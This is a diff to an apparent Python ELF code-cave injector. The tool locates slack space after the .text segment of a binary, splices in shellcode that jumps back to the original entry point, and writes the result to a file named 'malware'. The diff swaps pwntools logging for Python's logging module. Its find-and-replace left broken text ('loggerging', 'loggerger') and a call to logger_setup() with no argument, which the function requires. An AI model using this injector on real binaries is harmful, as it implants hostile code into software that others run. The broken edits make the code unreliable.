@@ -3,16 +3,37 @@ import binascii
 import argparse
 import sys
 import struct
+import logging
 from ctypes import *
 from os import path
 
-from pwn import *
 from elf import Elf64_Ehdr
 from elf import Elf64_Phdr
 from elf import Elf32_Ehdr
 from elf import Elf32_Phdr
 
-context.log_level = "info"
+
+def logger_setup(level):
+    '''setup logging for display'''
+    logger = logging.getLogger('fraggleROP')
+    # setup stream handler to stderr output
+    ch = logging.StreamHandler()
+   
+    # Verbose output if DEBUG is passed else normal
+    if level == "DEBUG":
+        logger.setLevel(logging.DEBUG)
+        ch.setLevel(logging.DEBUG)
+    elif level == "ERROR":
+        logger.setLevel(logging.ERROR)
+        ch.setLevel(logging.ERROR)
+    else:
+        logger.setLevel(logging.INFO)
+        ch.setLevel(logging.INFO)
+
+    # add handler to loggerger for display
+    logger.addHandler(ch)
+
+    return logger
 
 def parse_structures(file):
     '''Parse the ELF header as well as the program headers
@@ -58,25 +79,25 @@ def parse_structures(file):
     f.close()
 
 
-    log.info(elf)
-    log.info("Number of sections found: %d" % len(phdr_list))
+    logger.info(elf)
+    logger.info("Number of sections found: %d" % len(phdr_list))
 
     # iterate through program header list and display if verbose mode enabled
     # pop out the sections that are not marked as loadable for easier locating
     # of an ideal codecave
     load_list = []
     for phdr in phdr_list:
-        log.debug(phdr_list.index(phdr)+1)
-        log.debug(phdr)
+        logger.debug(phdr_list.index(phdr)+1)
+        logger.debug(phdr)
         if phdr.p_type == 1:
-            log.debug("Section marked as LOAD: Retaining.")
-            log.debug("")
+            logger.debug("Section marked as LOAD: Retaining.")
+            logger.debug("")
             load_list.append(phdr)
         else:
-            log.debug("Not a LOAD section.")
-            log.debug("")
+            logger.debug("Not a LOAD section.")
+            logger.debug("")
 
-    log.info("Number of LOAD sections: %d" % len(load_list))
+    logger.info("Number of LOAD sections: %d" % len(load_list))
 
     return elf,load_list
 
@@ -93,11 +114,11 @@ def locate_codecave(load_sections,payload_sz):
 
         if section.p_flags & 0x1:
 
-            log.debug("Found .text segment.")
-            log.debug(section)
+            logger.debug("Found .text segment.")
+            logger.debug(section)
             text_seg = section
             text_end = section.p_offset + section.p_filesz
-            log.debug(".text end is: %x" % text_end)
+            logger.debug(".text end is: %x" % text_end)
 
     # Remove .text segment prior to comparing to remaining sections
     load_sections.remove(text_seg)
@@ -108,7 +129,7 @@ def locate_codecave(load_sections,payload_sz):
     # calculate the next offset to be 16 byte aligned
     # ex. 0x40000 vice 0x3fffff
     mem_align = text_end + (16 - (text_end & 0xf))
-    log.debug("code cave alignment is: %x" % mem_align)
+    logger.debug("code cave alignment is: %x" % mem_align)
 
     # calculate distance between .text and next closest section
     # save the lowest gap size as long as it is greater than 0
@@ -117,16 +138,16 @@ def locate_codecave(load_sections,payload_sz):
         text_dist = section.p_offset - mem_align
         if text_dist < gap and text_dist > 0:
 
-            log.debug("Found LOAD segment close to .text (offset: %x)" % section.p_offset)
-            log.debug(section)
+            logger.debug("Found LOAD segment close to .text (offset: %x)" % section.p_offset)
+            logger.debug(section)
             gap = text_dist
 
-    log.info(".txt segment gap at offset %x (%d bytes available)" % (text_end, gap))
+    logger.info(".txt segment gap at offset %x (%d bytes available)" % (text_end, gap))
     
-    # If the code cave gap is too small for the payload: log error and exit
+    # If the code cave gap is too small for the payload: logger error and exit
     try:
         if gap < payload_sz:
-            log.error("Failed to locate a code cave large enough to inject the payload.")
+            logger.error("Failed to locate a code cave large enough to inject the payload.")
     except:
         sys.exit()
 
@@ -140,14 +161,14 @@ def inject_shellcode(elf,txt_segment,payload,args):
     mem_align = txt_segment.p_filesz + (16 - (txt_segment.p_filesz & 0xf))
     cave_offset = txt_segment.p_offset + mem_align
     cave_entry  = txt_segment.p_vaddr + mem_align
-    log.debug("cave offset at: %x" % cave_offset)
-    log.debug("cave memory load offset at: %x" % cave_entry)
+    logger.debug("cave offset at: %x" % cave_offset)
+    logger.debug("cave memory load offset at: %x" % cave_entry)
 
     # rebuild payload with the target binary's previous entry point
     #shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
     shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
 
-    log.debug("New payload size is: %d" % len(shellcode))
+    logger.debug("New payload size is: %d" % len(shellcode))
 
     # read in the target binary in order to inject payload into
     with open(target_file,'rb') as f:
@@ -162,7 +183,7 @@ def inject_shellcode(elf,txt_segment,payload,args):
     if args.test:
         with open("test_shellcode","wb") as f:
             f.write(shellcode)
-        log.debug("Test shell code successfully generated.")
+        logger.debug("Test shell code successfully generated.")
 
     else:
 
@@ -170,7 +191,7 @@ def inject_shellcode(elf,txt_segment,payload,args):
         with open("malware","wb") as f:
             f.write(data)
     
-        log.info("Shellcode successfully injected into: %s" % target_file)
+        logger.info("Shellcode successfully injected into: %s" % target_file)
         
 
 def shellcode(payload):
@@ -186,11 +207,11 @@ def shellcode(payload):
 
     # calculate the offset and grab only the last byte (assuming small binary)
     offset = shell_elf.e_entry & 0xff
-    log.debug("Shellcode offset located at 0x%x" % offset)
+    logger.debug("Shellcode offset located at 0x%x" % offset)
     
     # start at the offset and read the entire section
     shellcode = data[offset:]
-    log.info("Shellcode %dB in size." % len(shellcode))
+    logger.info("Shellcode %dB in size." % len(shellcode))
 
     return shellcode
 
@@ -202,8 +223,8 @@ def file_check(file_name):
         print("Failed to open file.")
         sys.exit()
 
-def change_loglevel(level):
-    context.log_level = level
+'''def change_loggerlevel(level):
+    context.logger_level = level'''
 
 def args():
 
@@ -219,7 +240,7 @@ def args():
     parser.add_argument("-t", dest="test", action="store_true",
             help="Test building the new shellcode. Do not actually inject.")
     parser.add_argument("-v", dest="verbose", action="store_true",
-            help="Enable verbose logging.")
+            help="Enable verbose loggerging.")
     parser.add_argument("-s", dest="silent", action="store_true",
             help="Enable silent mode.")
     parser.add_argument("-c", dest="shellcode", type=file_check, default="shellcode",
@@ -232,16 +253,19 @@ def args():
 if __name__ == '__main__':
     
     global target_file
+    global logger
 
     args = args()
 
     target_file = args.file
 
-    # determine logging level based on arguments
+    # determine loggerging level based on arguments
     if args.verbose:
-        change_loglevel("debug")
+        logger = logger_setup("DEBUG")
     elif args.silent:
-        change_loglevel("error")
+        logger = logger_setup("ERROR")
+    else:
+        logger = logger_setup()
     
     # attempt to parse the target binary
     try:
@@ -258,7 +282,7 @@ if __name__ == '__main__':
 
     # locate offsets and implant if possible and indicated at the commandline
     if args.locate or args.implant or args.test:
-        log.info("Attempting to locate code cave in file: %s" % args.file)
+        logger.info("Attempting to locate code cave in file: %s" % args.file)
 
         text_segment = locate_codecave(load_sections,len(code))
 
